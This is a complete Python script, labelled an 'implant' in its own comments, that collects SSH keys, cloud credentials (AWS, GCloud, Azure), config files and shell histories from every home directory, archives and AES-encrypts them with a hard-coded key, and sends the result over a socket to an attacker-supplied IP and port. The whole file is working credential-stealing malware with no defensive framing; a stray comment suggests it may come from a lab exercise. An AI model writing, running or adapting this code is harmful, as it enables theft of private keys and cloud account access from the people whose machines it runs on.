#!/usr/bin/env python3
import sys, os, socket, glob
from io import BytesIO
from zipfile import ZipFile, ZIP_DEFLATED
from Cryptodome.Cipher import AES

# Hard-coded 32-byte AES Key and initialization vector
KEY = b'1234567890ABCDEFGHIJKLMNOPQRSTUV'
BLOCK_SIZE = AES.block_size


# Helper function that:
#	- Reads the contents of all discovered files into memory (permitted)
#		Support: ~/.ssh/, ~/.config/, ~/.aws/, ~/.gcloud/, ~/.azure/, ~/.*_history
#	- After reading all the files, returns files array
#	- Update: The files can be hidden or nested within more subdirectories. Update the logic
def getFiles():
	patterns = [
		'/home/*/.ssh/**/*', 
		'/home/*/.config/**/*',
		'/home/*/.aws/**/*',
		'/home/*/.gcloud/**/*',
		'/home/*/.azure/**/*',
		'/home/*/.*_history'
	]
	
	files = set()
	for pattern in patterns:
		for path in glob.glob(pattern, recursive=True):
			if os.path.isfile(path):
				files.add(path)
	return sorted(files)

# Helper function that:
#	- Compresses the files array into zipfile
#	- Relative path is set to /home
#	- Returns the compressed zipfile
def buildArchive(files):
	archive = BytesIO()
	with ZipFile(archive, 'w', ZIP_DEFLATED) as z:
		for filepath in files:
			arcname = os.path.relpath(filepath, '/home')
			z.write(filepath, arcname)
	return archive.getvalue()
	
# For fixed size blocks, this appends bytes to reach block size. 
def pkcs7_pad(data):
	padLen = BLOCK_SIZE - (len(data) % BLOCK_SIZE)
	return data + bytes([padLen])*padLen

# Helper function that:
#	- encrypts using AES symmetric encryption
#	- Returns nonce, tag, and ciphertext (all concatenated)
#	- Utilizes hardcoded key
def encrypt(archive):
	iv = os.urandom(BLOCK_SIZE)
	cipher = AES.new(KEY, AES.MODE_CBC, iv)
	return iv + cipher.encrypt(pkcs7_pad(archive))

# Main function runs the program
#	- Extracts user input for ip address and port that server runs on
#	- Then performs retrieval, comrpession, and encryption
#	- Finally, transmits the archive via socket connection to server
def main():
	if(len(sys.argv) != 3):
		return -1 # Invalid usage, kill the program
	
	server_ip, port = sys.argv[1], int(sys.argv[2])
	
	files = getFiles()
	#print(files)
	#for filename in files[:7]:
	#	fullpath = os.path.join("/home", filename)
	#	with open(fullpath, 'r') as fp:
	#		content = fp.read()
	#	print(f"{filename} --- {content}")
	#	print()
	archive = buildArchive(files)
	payload = encrypt(archive)
	with socket.create_connection((server_ip, port)) as s:
		s.sendall(payload)

# Run tmp363 implant
main()
